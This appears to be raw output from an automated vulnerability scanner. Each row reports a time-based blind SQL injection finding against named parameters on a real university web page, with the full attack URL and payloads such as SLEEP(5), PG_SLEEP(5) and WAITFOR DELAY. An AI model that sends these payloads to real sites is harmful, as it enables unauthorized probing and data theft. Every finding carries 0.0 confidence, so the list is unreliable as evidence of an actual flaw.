Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?page=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?file=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?page=1%22+AND+SLEEP%285%29--#1574016446128-383c784a-e794),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?cmd=1%22+AND+SLEEP%285%29--#1574016446128-383c784a-e794),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?query=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?page=1%27+AND+SLEEP%285%29--#1574016446128-383c784a-e794),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?query=1%22+AND+SLEEP%285%29--#1574016446128-383c784a-e794),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?file=1%22+AND+SLEEP%285%29--#1574016446128-383c784a-e794),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?search=1%22+AND+SLEEP%285%29--#1574016446128-383c784a-e794),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?query=1%27+AND+SLEEP%285%29--#1574016446128-383c784a-e794),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?id=1%22+AND+SLEEP%285%29--#1574016446128-383c784a-e794),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?id=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?page=SLEEP%285%29%23#1574016446128-383c784a-e794),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?file=1%27+AND+SLEEP%285%29--#1574016446128-383c784a-e794),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016446128-383c784a-e794),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?cmd=1%27+AND+SLEEP%285%29--#1574016446128-383c784a-e794),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?file=1+OR+SLEEP%285%29#1574016446128-383c784a-e794),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?search=1+OR+SLEEP%285%29#1574016446128-383c784a-e794),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?query=1+OR+SLEEP%285%29#1574016446128-383c784a-e794),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?search=SLEEP%285%29%23#1574016446128-383c784a-e794),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?id=SLEEP%285%29%23#1574016446128-383c784a-e794),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?q=SLEEP%285%29%23#1574016446128-383c784a-e794),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?q=1+OR+SLEEP%285%29#1574016446128-383c784a-e794),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?q=1%27+AND+SLEEP%285%29--#1574016446128-383c784a-e794),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?cmd=SLEEP%285%29%23#1574016446128-383c784a-e794),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?id=1%27+AND+SLEEP%285%29--#1574016446128-383c784a-e794),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?cmd=1+OR+SLEEP%285%29#1574016446128-383c784a-e794),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016446128-383c784a-e794),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?id=1+OR+SLEEP%285%29#1574016446128-383c784a-e794),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?query=SLEEP%285%29%23#1574016446128-383c784a-e794),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016446128-383c784a-e794),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016446128-383c784a-e794),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?file=SLEEP%285%29%23#1574016446128-383c784a-e794),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?search=1%27+AND+SLEEP%285%29--#1574016446128-383c784a-e794),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016446128-383c784a-e794),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016446128-383c784a-e794),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?page=1+OR+SLEEP%285%29#1574016446128-383c784a-e794),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016446128-383c784a-e794),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?id=1%27+AND+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?q=1%27+AND+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?search=1%27+AND+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?query=1%27+AND+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?page=1%27+AND+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?cmd=1%27+AND+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?file=1%27+AND+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016446128-383c784a-e794),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?file=1+OR+SLEEP%285%29#1574016447632-86c3ad7e-821a),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?query=SLEEP%285%29%23#1574016447632-86c3ad7e-821a),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?query=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?cmd=1+OR+SLEEP%285%29#1574016447632-86c3ad7e-821a),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?q=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?q=SLEEP%285%29%23#1574016447632-86c3ad7e-821a),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?search=SLEEP%285%29%23#1574016447632-86c3ad7e-821a),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?page=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?query=1+OR+SLEEP%285%29#1574016447632-86c3ad7e-821a),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?page=1+OR+SLEEP%285%29#1574016447632-86c3ad7e-821a),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?file=1%27+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
